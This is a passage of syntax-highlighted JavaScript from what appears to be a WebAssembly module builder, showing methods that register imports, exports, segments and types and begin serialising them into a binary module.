    <span class="hljs-keyword">let</span> tag_index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tags</span>.<span class="hljs-property">length</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_tags</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tags</span>.<span class="hljs-title function_">push</span>(type_index);
    <span class="hljs-keyword">return</span> tag_index;
  }

  <span class="hljs-title function_">addFunction</span>(<span class="hljs-params">name, type, arg_names</span>) {
    arg_names = arg_names || [];
    <span class="hljs-keyword">let</span> type_index = (<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span> ? type : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addType</span>(type);
    <span class="hljs-keyword">let</span> num_args = <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>[type_index].<span class="hljs-property">params</span>.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">if</span> (num_args &lt; arg_names.<span class="hljs-property">length</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;too many arg names provided&#x27;</span>);
    }
    <span class="hljs-keyword">if</span> (num_args &gt; arg_names.<span class="hljs-property">length</span>) {
      arg_names.<span class="hljs-title function_">push</span>(num_args - arg_names.<span class="hljs-property">length</span>);
    }
    <span class="hljs-keyword">let</span> func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmFunctionBuilder</span>(<span class="hljs-variable language_">this</span>, name, type_index, arg_names);
    func.<span class="hljs-property">index</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">functions</span>.<span class="hljs-property">length</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_funcs</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">functions</span>.<span class="hljs-title function_">push</span>(func);
    <span class="hljs-keyword">return</span> func;
  }

  <span class="hljs-title function_">addImport</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, name, type, kind = kExternalFunction</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">functions</span>.<span class="hljs-property">length</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Imported functions must be declared before local ones&#x27;</span>);
    }
    <span class="hljs-keyword">let</span> type_index = (<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span> ? type : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addType</span>(type);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">push</span>({<span class="hljs-variable language_">module</span>, name, kind, type_index});
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_funcs</span>++;
  }

  <span class="hljs-title function_">addImportedGlobal</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, name, type, mutable = <span class="hljs-literal">false</span>, shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">globals</span>.<span class="hljs-property">length</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Imported globals must be declared before local ones&#x27;</span>);
    }
    <span class="hljs-keyword">let</span> kind = kExternalGlobal;
    <span class="hljs-keyword">let</span> o = {<span class="hljs-variable language_">module</span>, name, kind, type, mutable, shared};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">push</span>(o);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_globals</span>++;
  }

  <span class="hljs-title function_">addImportedMemory</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, name, initial = <span class="hljs-number">0</span>, maximum, shared, is_memory64</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span>.<span class="hljs-property">length</span> !== <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
          <span class="hljs-string">&#x27;Add imported memories before declared memories to avoid messing &#x27;</span> +
          <span class="hljs-string">&#x27;up the indexes&#x27;</span>);
    }
    <span class="hljs-keyword">let</span> mem_index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> i.<span class="hljs-property">kind</span> == kExternalMemory).<span class="hljs-property">length</span>;
    <span class="hljs-keyword">let</span> kind = kExternalMemory;
    shared = !!shared;
    is_memory64 = !!is_memory64;
    <span class="hljs-keyword">let</span> o = {<span class="hljs-variable language_">module</span>, name, kind, initial, maximum, shared, is_memory64};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">push</span>(o);
    <span class="hljs-keyword">return</span> mem_index;
  }

  <span class="hljs-title function_">addImportedTable</span>(<span class="hljs-params">
      <span class="hljs-variable language_">module</span>, name, initial, maximum, type = kWasmFuncRef, shared = <span class="hljs-literal">false</span>,
      is_table64 = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span>.<span class="hljs-property">length</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Imported tables must be declared before local ones&#x27;</span>);
    }
    <span class="hljs-keyword">let</span> o = {
      <span class="hljs-variable language_">module</span>,
      name,
      <span class="hljs-attr">kind</span>: kExternalTable,
      initial,
      maximum,
      type,
      <span class="hljs-attr">shared</span>: !!shared,
      <span class="hljs-attr">is_table64</span>: !!is_table64,
    };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">push</span>(o);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_tables</span>++;
  }

  <span class="hljs-title function_">addImportedTag</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, name, type</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">tags</span>.<span class="hljs-property">length</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Imported tags must be declared before local ones&#x27;</span>);
    }
    <span class="hljs-keyword">let</span> type_index = (<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span> ? type : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addType</span>(type);
    <span class="hljs-keyword">let</span> kind = kExternalTag;
    <span class="hljs-keyword">let</span> o = {<span class="hljs-variable language_">module</span>, name, kind, type_index};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">push</span>(o);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_tags</span>++;
  }

  <span class="hljs-title function_">addExport</span>(<span class="hljs-params">name, index</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">exports</span>.<span class="hljs-title function_">push</span>({<span class="hljs-attr">name</span>: name, <span class="hljs-attr">kind</span>: kExternalFunction, <span class="hljs-attr">index</span>: index});
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addExportOfKind</span>(<span class="hljs-params">name, kind, index</span>) {
    <span class="hljs-keyword">if</span> (index === <span class="hljs-literal">undefined</span> &amp;&amp; kind != kExternalTable &amp;&amp;
        kind != kExternalMemory) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
          <span class="hljs-string">&#x27;Index for exports other than tables/memories must be provided&#x27;</span>);
    }
    <span class="hljs-keyword">if</span> (index !== <span class="hljs-literal">undefined</span> &amp;&amp; (<span class="hljs-keyword">typeof</span> index) != <span class="hljs-string">&#x27;number&#x27;</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Index for exports must be a number&#x27;</span>)
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">exports</span>.<span class="hljs-title function_">push</span>({<span class="hljs-attr">name</span>: name, <span class="hljs-attr">kind</span>: kind, <span class="hljs-attr">index</span>: index});
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addActiveDataSegment</span>(<span class="hljs-params">memory_index, offset, data, is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-title function_">checkExpr</span>(offset);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data_segments</span>.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">is_active</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">is_shared</span>: is_shared,
      <span class="hljs-attr">mem_index</span>: memory_index,
      <span class="hljs-attr">offset</span>: offset,
      <span class="hljs-attr">data</span>: data
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">data_segments</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-title function_">addPassiveDataSegment</span>(<span class="hljs-params">data, is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data_segments</span>.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">is_active</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">is_shared</span>: is_shared, <span class="hljs-attr">data</span>: data});
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">data_segments</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-title function_">exportMemoryAs</span>(<span class="hljs-params">name, memory_index</span>) {
    <span class="hljs-keyword">if</span> (memory_index === <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">const</span> num_memories = <span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span>.<span class="hljs-property">length</span> +
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> i.<span class="hljs-property">kind</span> == kExternalMemory).<span class="hljs-property">length</span>;
      <span class="hljs-keyword">if</span> (num_memories !== <span class="hljs-number">1</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
            <span class="hljs-string">&#x27;Pass memory index to \&#x27;exportMemoryAs\&#x27; if there is not exactly &#x27;</span> +
            <span class="hljs-string">&#x27;one memory imported or declared.&#x27;</span>);
      }
      memory_index = <span class="hljs-number">0</span>;
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">exports</span>.<span class="hljs-title function_">push</span>({<span class="hljs-attr">name</span>: name, <span class="hljs-attr">kind</span>: kExternalMemory, <span class="hljs-attr">index</span>: memory_index});
  }

  <span class="hljs-comment">// {offset} is a constant expression.</span>
  <span class="hljs-comment">// If {type} is undefined, then {elements} are function indices. Otherwise,</span>
  <span class="hljs-comment">// they are constant expressions.</span>
  <span class="hljs-title function_">addActiveElementSegment</span>(<span class="hljs-params">table, offset, elements, type, is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-title function_">checkExpr</span>(offset);
    <span class="hljs-keyword">if</span> (type != <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> element <span class="hljs-keyword">of</span> elements) <span class="hljs-title function_">checkExpr</span>(element);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span>.<span class="hljs-title function_">push</span>(
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmElemSegment</span>(table, offset, type, elements, <span class="hljs-literal">false</span>, is_shared));
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">// If {type} is undefined, then {elements} are function indices. Otherwise,</span>
  <span class="hljs-comment">// they are constant expressions.</span>
  <span class="hljs-title function_">addPassiveElementSegment</span>(<span class="hljs-params">elements, type, is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (type != <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> element <span class="hljs-keyword">of</span> elements) <span class="hljs-title function_">checkExpr</span>(element);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span>.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmElemSegment</span>(
      <span class="hljs-literal">undefined</span>, <span class="hljs-literal">undefined</span>, type, elements, <span class="hljs-literal">false</span>, is_shared));
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">// If {type} is undefined, then {elements} are function indices. Otherwise,</span>
  <span class="hljs-comment">// they are constant expressions.</span>
  <span class="hljs-title function_">addDeclarativeElementSegment</span>(<span class="hljs-params">elements, type, is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (type != <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> element <span class="hljs-keyword">of</span> elements) <span class="hljs-title function_">checkExpr</span>(element);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span>.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmElemSegment</span>(
      <span class="hljs-literal">undefined</span>, <span class="hljs-literal">undefined</span>, type, elements, <span class="hljs-literal">true</span>, is_shared));
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-title function_">appendToTable</span>(<span class="hljs-params">array</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> n <span class="hljs-keyword">of</span> array) {
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> n != <span class="hljs-string">&#x27;number&#x27;</span>)
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;invalid table (entries have to be numbers): &#x27;</span> + array);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span>.<span class="hljs-property">length</span> == <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addTable</span>(kWasmAnyFunc, <span class="hljs-number">0</span>);
    }
    <span class="hljs-comment">// Adjust the table to the correct size.</span>
    <span class="hljs-keyword">let</span> table = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span>[<span class="hljs-number">0</span>];
    <span class="hljs-keyword">const</span> base = table.<span class="hljs-property">initial_size</span>;
    <span class="hljs-keyword">const</span> table_size = base + array.<span class="hljs-property">length</span>;
    table.<span class="hljs-property">initial_size</span> = table_size;
    <span class="hljs-keyword">if</span> (table.<span class="hljs-property">has_max</span> &amp;&amp; table_size &gt; table.<span class="hljs-property">max_size</span>) {
      table.<span class="hljs-property">max_size</span> = table_size;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addActiveElementSegment</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_">wasmI32Const</span>(base), array);
  }

  <span class="hljs-title function_">setTableBounds</span>(<span class="hljs-params">min, max = <span class="hljs-literal">undefined</span></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span>.<span class="hljs-property">length</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;The table bounds of table \&#x27;0\&#x27; have already been set.&#x27;</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addTable</span>(kWasmAnyFunc, min, max);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">startRecGroup</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rec_groups</span>.<span class="hljs-title function_">push</span>({<span class="hljs-attr">start</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span>, <span class="hljs-attr">size</span>: <span class="hljs-number">0</span>});
  }

  <span class="hljs-title function_">endRecGroup</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">rec_groups</span>.<span class="hljs-property">length</span> == <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Did not start a recursive group before ending one&quot;</span>)
    }
    <span class="hljs-keyword">let</span> last_element = <span class="hljs-variable language_">this</span>.<span class="hljs-property">rec_groups</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">rec_groups</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]
    <span class="hljs-keyword">if</span> (last_element.<span class="hljs-property">size</span> != <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Did not start a recursive group before ending one&quot;</span>)
    }
    last_element.<span class="hljs-property">size</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span> - last_element.<span class="hljs-property">start</span>;
  }

  <span class="hljs-title function_">setName</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">setCompilationPriority</span>(<span class="hljs-params">
      function_index, compilation_priority, optimization_priority</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">compilation_priorities</span>.<span class="hljs-title function_">set</span>(function_index, {
      compilation_priority, optimization_priority
    });
  }

  <span class="hljs-comment">// `instruction_frequencies` must be an array of {offset, frequency} objects.</span>
  <span class="hljs-title function_">setInstructionFrequencies</span>(<span class="hljs-params">function_index, instruction_frequencies</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(instruction_frequencies)) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;instruction_frequencies must be an array&quot;</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">instruction_frequencies</span>.<span class="hljs-title function_">set</span>(function_index, instruction_frequencies);
  }

  <span class="hljs-comment">// `call_targets` must be an array of {offset, targets} object, where</span>
  <span class="hljs-comment">// `targets` is an array of {function_index, frequency_percent} objects.</span>
  <span class="hljs-title function_">setCallTargets</span>(<span class="hljs-params">function_index, call_targets</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(call_targets)) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;call_targets must be an array&quot;</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">call_targets</span>.<span class="hljs-title function_">set</span>(function_index, call_targets);
  }

  <span class="hljs-title function_">toBuffer</span>(<span class="hljs-params">debug = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">let</span> binary = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binary</span>;
    <span class="hljs-keyword">let</span> wasm = <span class="hljs-variable language_">this</span>;

    <span class="hljs-comment">// Add header.</span>
    binary.<span class="hljs-title function_">emit_header</span>();

    <span class="hljs-comment">// Add type section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">types</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting types @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kTypeSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        <span class="hljs-keyword">let</span> length_with_groups = wasm.<span class="hljs-property">types</span>.<span class="hljs-property">length</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> group <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">rec_groups</span>) {
          length_with_groups -= group.<span class="hljs-property">size</span> - <span class="hljs-number">1</span>;
        }
        section.<span class="hljs-title function_">emit_u32v</span>(length_with_groups);

        <span class="hljs-keyword">let</span> rec_group_index = <span class="hljs-number">0</span>;

        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; wasm.<span class="hljs-property">types</span>.<span class="hljs-property">length</span>; i++) {
          <span class="hljs-keyword">if</span> (rec_group_index &lt; wasm.<span class="hljs-property">rec_groups</span>.<span class="hljs-property">length</span> &amp;&amp;
              wasm.<span class="hljs-property">rec_groups</span>[rec_group_index].<span class="hljs-property">start</span> == i) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmRecursiveTypeGroupForm);
            section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">rec_groups</span>[rec_group_index].<span class="hljs-property">size</span>);
            rec_group_index++;
          }

          <span class="hljs-keyword">let</span> type = wasm.<span class="hljs-property">types</span>[i];
          <span class="hljs-keyword">if</span> (type.<span class="hljs-property">supertype</span> != kNoSuperType) {
            section.<span class="hljs-title function_">emit_u8</span>(type.<span class="hljs-property">is_final</span> ? kWasmSubtypeFinalForm
                                          : kWasmSubtypeForm);
            section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// supertype count</span>
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">supertype</span>);
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!type.<span class="hljs-property">is_final</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmSubtypeForm);
            section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// no supertypes</span>
          }
          <span class="hljs-keyword">if</span> (type.<span class="hljs-property">is_shared</span>) section.<span class="hljs-title function_">emit_u8</span>(kWasmSharedTypeForm);
          <span class="hljs-keyword">if</span> (type.<span class="hljs-property">describes</span> !== <span class="hljs-literal">undefined</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmDescribesTypeForm);
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">describes</span>);
          }
          <span class="hljs-keyword">if</span> (type.<span class="hljs-property">descriptor</span> !== <span class="hljs-literal">undefined</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmDescriptorTypeForm);
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">descriptor</span>);
          }
          <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">WasmStruct</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmStructTypeForm);
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">fields</span>.<span class="hljs-property">length</span>);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> field <span class="hljs-keyword">of</span> type.<span class="hljs-property">fields</span>) {
              section.<span class="hljs-title function_">emit_type</span>(field.<span class="hljs-property">type</span>);
              section.<span class="hljs-title function_">emit_u8</span>(field.<span class="hljs-property">mutability</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);
            }
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">WasmArray</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmArrayTypeForm);
            section.<span class="hljs-title function_">emit_type</span>(type.<span class="hljs-property">type</span>);
            section.<span class="hljs-title function_">emit_u8</span>(type.<span class="hljs-property">mutability</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">WasmCont</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmContTypeForm);
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">type_index</span>);
          } <span class="hljs-keyword">else</span> {
            section.<span class="hljs-title function_">emit_u8</span>(kWasmFunctionTypeForm);
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">params</span>.<span class="hljs-property">length</span>);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> param <span class="hljs-keyword">of</span> type.<span class="hljs-property">params</span>) {
              section.<span class="hljs-title function_">emit_type</span>(param);
            }
            section.<span class="hljs-title function_">emit_u32v</span>(type.<span class="hljs-property">results</span>.<span class="hljs-property">length</span>);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> result <span class="hljs-keyword">of</span> type.<span class="hljs-property">results</span>) {
              section.<span class="hljs-title function_">emit_type</span>(result);
            }
          }
        }
      });
    }

    <span class="hljs-comment">// Add imports section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">imports</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting imports @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kImportSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">imports</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> imp <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">imports</span>) {
          section.<span class="hljs-title function_">emit_string</span>(imp.<span class="hljs-property">module</span>);
          section.<span class="hljs-title function_">emit_string</span>(imp.<span class="hljs-property">name</span> || <span class="hljs-string">&#x27;&#x27;</span>);
          section.<span class="hljs-title function_">emit_u8</span>(imp.<span class="hljs-property">kind</span>);
          <span class="hljs-keyword">if</span> (imp.<span class="hljs-property">kind</span> == kExternalFunction ||
              imp.<span class="hljs-property">kind</span> == kExternalExactFunction) {
            section.<span class="hljs-title function_">emit_u32v</span>(imp.<span class="hljs-property">type_index</span>);
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (imp.<span class="hljs-property">kind</span> == kExternalGlobal) {
            section.<span class="hljs-title function_">emit_type</span>(imp.<span class="hljs-property">type</span>);
            <span class="hljs-keyword">let</span> flags = (imp.<span class="hljs-property">mutable</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) | (imp.<span class="hljs-property">shared</span> ? <span class="hljs-number">0b10</span> : <span class="hljs-number">0</span>);
            section.<span class="hljs-title function_">emit_u8</span>(flags);
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (imp.<span class="hljs-property">kind</span> == kExternalMemory) {
            <span class="hljs-keyword">const</span> has_max = imp.<span class="hljs-property">maximum</span> !== <span class="hljs-literal">undefined</span>;
            <span class="hljs-keyword">const</span> is_shared = !!imp.<span class="hljs-property">shared</span>;
            <span class="hljs-keyword">const</span> is_memory64 = !!imp.<span class="hljs-property">is_memory64</span>;
            <span class="hljs-keyword">let</span> limits_byte =
                (is_memory64 ? <span class="hljs-number">4</span> : <span class="hljs-number">0</span>) | (is_shared ? <span class="hljs-number">2</span> : <span class="hljs-number">0</span>) | (has_max ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);
            section.<span class="hljs-title function_">emit_u8</span>(limits_byte);
            <span class="hljs-keyword">let</span> <span class="hljs-title function_">emit</span> = val =&gt;
                is_memory64 ? section.<span class="hljs-title function_">emit_u64v</span>(val) : section.<span class="hljs-title function_">emit_u32v</span>(val);
            <span class="hljs-title function_">emit</span>(imp.<span class="hljs-property">initial</span>);
            <span class="hljs-keyword">if</span> (has_max) <span class="hljs-title function_">emit</span>(imp.<span class="hljs-property">maximum</span>);
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (imp.<span class="hljs-property">kind</span> == kExternalTable) {
            section.<span class="hljs-title function_">emit_type</span>(imp.<span class="hljs-property">type</span>);
            <span class="hljs-keyword">const</span> has_max = (<span class="hljs-keyword">typeof</span> imp.<span class="hljs-property">maximum</span>) != <span class="hljs-string">&#x27;undefined&#x27;</span>;
            <span class="hljs-keyword">const</span> is_shared = !!imp.<span class="hljs-property">shared</span>;
            <span class="hljs-keyword">const</span> is_table64 = !!imp.<span class="hljs-property">is_table64</span>;
            <span class="hljs-keyword">let</span> limits_byte =
